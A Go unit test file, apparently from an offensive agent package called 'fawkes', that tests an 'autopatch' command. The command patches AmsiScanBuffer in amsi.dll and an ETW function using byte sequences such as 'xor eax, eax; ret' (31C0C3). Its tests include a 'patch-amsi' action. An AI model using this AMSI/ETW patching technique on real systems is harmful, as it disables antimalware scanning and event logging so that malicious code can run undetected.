//go:build windows
// +build windows

package commands

import (
	"encoding/json"
	"testing"

	"fawkes/pkg/structs"
)

func TestPatchStrategies_AllDefined(t *testing.T) {
	expected := []string{"xor-ret", "ret", "nop-ret", "mov-ret"}
	for _, name := range expected {
		strat, ok := patchStrategies[name]
		if !ok {
			t.Errorf("Missing patch strategy: %s", name)
			continue
		}
		if strat.Name != name {
			t.Errorf("Strategy %s has Name=%q, want %q", name, strat.Name, name)
		}
		if len(strat.Bytes) == 0 {
			t.Errorf("Strategy %s has empty Bytes", name)
		}
		if strat.Description == "" {
			t.Errorf("Strategy %s has empty Description", name)
		}
	}
}

func TestPatchStrategies_XorRetBytes(t *testing.T) {
	strat := patchStrategies["xor-ret"]
	// xor eax, eax = 31 C0; ret = C3
	if len(strat.Bytes) != 3 || strat.Bytes[0] != 0x31 || strat.Bytes[1] != 0xC0 || strat.Bytes[2] != 0xC3 {
		t.Errorf("xor-ret bytes = %X, want 31C0C3", strat.Bytes)
	}
}

func TestPatchStrategies_RetBytes(t *testing.T) {
	strat := patchStrategies["ret"]
	if len(strat.Bytes) != 1 || strat.Bytes[0] != 0xC3 {
		t.Errorf("ret bytes = %X, want C3", strat.Bytes)
	}
}

func TestKnownTargets_AllDefined(t *testing.T) {
	expected := []string{"amsi", "etw"}
	for _, name := range expected {
		target, ok := knownTargets[name]
		if !ok {
			t.Errorf("Missing known target: %s", name)
			continue
		}
		if target.DLL == "" {
			t.Errorf("Target %s has empty DLL", name)
		}
		if target.Function == "" {
			t.Errorf("Target %s has empty Function", name)
		}
		if target.Strategy == "" {
			t.Errorf("Target %s has empty Strategy", name)
		}
		if _, ok := patchStrategies[target.Strategy]; !ok {
			t.Errorf("Target %s has unknown strategy: %s", name, target.Strategy)
		}
		if len(target.KnownPrologues) == 0 {
			t.Errorf("Target %s has no known prologues", name)
		}
	}
}

func TestAutoPatch_ScanAction(t *testing.T) {
	cmd := &AutoPatchCommand{}
	params, _ := json.Marshal(AutoPatchArgs{Action: "scan"})
	result := cmd.Execute(structs.Task{Params: string(params)})
	if result.Status != "success" {
		t.Errorf("scan should succeed, got status=%s output=%s", result.Status, result.Output)
	}
	// Output should be valid JSON array
	var results []patchScanResult
	if err := json.Unmarshal([]byte(result.Output), &results); err != nil {
		t.Errorf("scan output should be valid JSON: %v", err)
	}
}

func TestAutoPatch_UnknownAction(t *testing.T) {
	cmd := &AutoPatchCommand{}
	params, _ := json.Marshal(AutoPatchArgs{Action: "nonexistent"})
	result := cmd.Execute(structs.Task{Params: string(params)})
	if result.Status != "error" {
		t.Errorf("unknown action should error, got status=%s", result.Status)
	}
}

func TestAutoPatch_PatchAmsiNoAmsi(t *testing.T) {
	// This test runs in a test environment where amsi.dll may not be loaded
	// It should gracefully handle the DLL not being loaded
	cmd := &AutoPatchCommand{}
	params, _ := json.Marshal(AutoPatchArgs{Action: "patch-amsi"})
	result := cmd.Execute(structs.Task{Params: string(params)})
	// Either succeeds (DLL loaded) or errors gracefully (DLL not found)
	_ = result
}

func TestPatchScanResult_JSONMarshal(t *testing.T) {
	r := patchScanResult{
		DLL:      "amsi.dll",
		Function: "AmsiScanBuffer",
		Address:  "0x12345678",
		Loaded:   true,
		Found:    true,
	}
	data, err := json.Marshal(r)
	if err != nil {
		t.Fatalf("Marshal failed: %v", err)
	}
	var parsed map[string]interface{}
	if err := json.Unmarshal(data, &parsed); err != nil {
		t.Fatalf("Unmarshal failed: %v", err)
	}
	if parsed["dll"] != "amsi.dll" {
		t.Errorf("DLL = %v, want amsi.dll", parsed["dll"])
	}
}
